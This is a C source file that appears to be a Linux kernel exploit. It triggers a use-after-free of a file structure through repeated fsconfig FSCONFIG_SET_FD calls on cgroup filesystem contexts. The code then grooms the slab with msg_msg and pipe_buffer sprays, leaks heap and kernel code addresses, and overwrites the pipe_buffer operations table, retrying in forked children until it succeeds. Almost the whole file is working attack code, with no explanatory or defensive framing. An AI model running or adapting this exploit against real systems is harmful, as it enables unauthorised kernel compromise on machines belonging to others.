#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <assert.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "libexp.h"

#define __NR_fsconfig 431
#define __NR_fsopen 430
#define FSCONFIG_SET_FD 5

int fd1, fd2, fd3, fd4, fd5, fd6;
int msgqid;
char payload[0x1200-0x30-8];
char payload2[0x200-0x30];

#define SPRAY_NUM 0x40
#define SPRAY_NUM2 0x140
#define PIPE_SPRAY_NUM 0x100
#define CRASH_ADDR 0xffffffffdeadbeef
int fds[SPRAY_NUM];
int fds2[SPRAY_NUM2];
int pipe_fds[PIPE_SPRAY_NUM*2];

int *crash;
int *success;

int identify_msg_once(struct msg_spray_t *spray)
{
	char buffer[sizeof(payload)+0x10];
	long *ptr = &buffer[0x1000-0x30];// first 0x1000-0x30 bytes are irrelevant
	int found = 0;
	int ret;

	// puts("identify_msg_once");

	memset(buffer, 0, sizeof(buffer));

	for(int i=0; i<spray->num; i++) {
		ret = msgrcv(spray->msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		assert(ret >= 0);
		for(int i=0; i<(0x200-8)/8; i++) {
			if(ptr[i] != 0x4343434343434343) {
				return 1;
			}
		}
		ret = msgrcv(spray->msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT);
		assert(ret >= 0);
	}
	return 0;
}

int identify_msg(struct msg_spray_t *spray)
{
	while(spray != NULL) {
		// puts("identify_msg");
		// printf("%p\n", spray);
		int found = identify_msg_once(spray);
		if(found) {
			break;
		}
		spray = spray->next;
	}

	assert(spray != NULL);

	return spray->msgqid;
}

void exploit(void)
{
	// // clear other objects in the same cache as our victim object
	// // the target slab will be added to cpu_partial
	// ioctl(fd3, 0x41414141, 0x42424242);
	for(int i=0; i<SPRAY_NUM; i++) close(fds[i]);
	usleep(100000);

	// force the kernel to drain cpu_partial
	for(int i=0; i<SPRAY_NUM2; i++) {
		if(i % 2 == 0) close(fds2[i]);
	}
	usleep(100000);

	// now free UAF file struct, which is the last object in the slab
	// now the slab is empty and unfrozen, should be discarded now
	ioctl(fd3, 0x41414141, 0x42424242);
	ts_fence();
	close(fd1);

	// reclaim the freed slab pages
	struct msg_spray_t *spray = msg_spray(payload, sizeof(payload), 0x200);

	// dup fd so one value will get increased by 1 so we can identify this
	dup(fd3);

	// now identify the message overlapping with the target struct file by
	// 1. peek into the message, check whether it is the target message
	// 2. if it is not the target message, free it
	// 3. if it is the target message, break
	// 4. identify the offset => where the target struct starts
	// 5. if the target struct file lies across two messages, we abort the exploitation
	int msgqid = identify_msg(spray);
	puts("Found target message!");
	char buffer[sizeof(payload)+0x10];
	long *ptr = &buffer[0x1000-0x30];// first 0x1000-0x30 bytes are irrelevant
	msgrcv(msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	int offset = -1;
	for(int i=0; i<(0x200-8)/8; i++) {
		if(ptr[i] != 0x4343434343434343) offset = i*8 - 0x50;// offset of f_count
	}
	printf("offset: %#x\n", offset);
	sleep(1);
	assert(offset <= 0xc0);
	assert(offset > 0);

	// now we are sure the page is reclaimed, close all useless files
	for(int i=0; i<SPRAY_NUM2; i++) close(fds2[i]);

	// free the file struct the second time and reclaim it with a msg_msg struct
	memset(&payload[8], 0x42, sizeof(payload));
	ts_fence();
	close(fd2);
	struct msg_spray_t *spray2 = msg_spray(payload, 0x108-0x30, 0x40);

	// now read the msg_msg header to leak a heap address that is in our control
	u64 heap_ptr = 0;
	u64 heap_ptr2 = 0;
	msgrcv(msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	for(int i=0; i<(0x200-8)/8; i++) {
		if(ptr[i] == 0x4141414141414141)  {
			heap_ptr = ptr[i-2];
			heap_ptr2 = ptr[i-1];
		}
	}
	printf("heap_ptr: %#llx\n", heap_ptr);
	printf("heap_ptr2: %#llx\n", heap_ptr2);

	// now free the inner msg_msg and replace it with pipe_buffer
	for(int i=0; i<PIPE_SPRAY_NUM; i++) pipe(&pipe_fds[i*2]);
	ts_fence();
	close(fd4);
	for(int i=0; i<PIPE_SPRAY_NUM; i++) {
		fcntl(pipe_fds[i], F_SETPIPE_SZ, 7*0x1000);
	}
	void *tmp = malloc(0xa800);
	for(int i=0; i<PIPE_SPRAY_NUM; i++) {
		write(pipe_fds[i], tmp, 0x6800);
	}

	// peek into it to leak kernel code base
	msgrcv(msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	u64 leak_val = ptr[(offset+0x10)/8];
	printf("leak_val: %#llx\n", leak_val);
	u64 code_base = leak_val - 0xffffffff82582040 + 0xffffffff81000000;
	printf("code_base: %#llx\n", code_base);

	// free inner msg and prepare pipe_buffer->ops vtable
	long *ptr2 = (long *)payload2;
	for(int i=1; i<sizeof(payload2)/8; i++) {
		ptr2[i] = CRASH_ADDR;
	}

	memset(payload2, 0x41, 8);
	close(fd5);
	msg_spray(payload2, 0x130-0x30, 0x100);

	// peek into it to leak fops addr
	msgrcv(msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	u64 fops_addr = ptr[offset/8]+0x30;
	printf("fops addr: %#llx\n", fops_addr);

	// free the outer msg to overwrite fops
	msgrcv(msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT);
	ptr2 = (long *)payload2;
	for(int i=1; i<sizeof(payload2)/8; i++) {
		ptr2[i] = fops_addr;
	}
	msg_spray(payload2, 0x200-0x30, 0x100);

	puts("before trigger...");
	// sleep(1);
	// getchar();
	// trigger
	for(int i=0; i<PIPE_SPRAY_NUM; i++) {
		read(pipe_fds[i], NULL, 1);
	}
	// close(fd3);
}

void context_setup()
{
	// defragmentation
	for(int i=0; i<0x280; i++) open("/etc/passwd", O_RDONLY);

	fd1 = syscall(__NR_fsopen, "cgroup", 0ul);
	fd2 = syscall(__NR_fsopen, "cgroup", 0ul);
	fd4 = syscall(__NR_fsopen, "cgroup", 0ul);
	fd5 = syscall(__NR_fsopen, "cgroup", 0ul);
	fd6 = syscall(__NR_fsopen, "cgroup", 0ul);
	//assert(fd1 >= 0);

	// prepare heap layout, force the victim struct file to be surrounded by spray objects
	for(int i=0; i<SPRAY_NUM/2; i++) fds[i] = open("/dev/null", O_RDONLY);
	fd3 = syscall(__NR_open, "/proc/mtrr", O_RDONLY);
	for(int i=0; i<SPRAY_NUM/2; i++) fds[SPRAY_NUM/2+i] = open("/dev/null", O_RDONLY);

	// do a second spray for later unfreezing
	for(int i=0; i<SPRAY_NUM2; i++) fds2[i] = open("/dev/null", O_RDONLY);

	// trigger vulnerability
	syscall(__NR_fsconfig, fd1, FSCONFIG_SET_FD, "source", NULL, fd3);
	syscall(__NR_fsconfig, fd2, FSCONFIG_SET_FD, "source", NULL, fd3);
	syscall(__NR_fsconfig, fd4, FSCONFIG_SET_FD, "source", NULL, fd3);
	syscall(__NR_fsconfig, fd5, FSCONFIG_SET_FD, "source", NULL, fd3);
	syscall(__NR_fsconfig, fd6, FSCONFIG_SET_FD, "source", NULL, fd3);
}

void payload_setup()
{
	long *ptr = (long *)payload;
	for(int i=0; i<sizeof(payload)/8; i++) {
		ptr[i] = 0x4343434343434343;
	}

	memset(payload, 'A', 0x10);
}

void handle_sig(int sig)
{
    printf("Caught signal %d\n", sig);
	puts("sleep!");
	*crash = 1;
	sleep(10000);
}

void attempt(void)
{
	signal(SIGABRT, handle_sig);
	set_cpu(0);
	context_setup();
	payload_setup();
	exploit();
}

void main(void)
{
	setup_sandbox();
	crash = (int *)umem_alloc(NULL, 0x1000);
	success = crash + 1;
	*success = 0;
	while(*success == 0) {
		*crash = 0;
		if(!fork()) {
			attempt();
		}
		while(*crash == 0) {
			usleep(100000);
		}
	}

	exit(0);
}
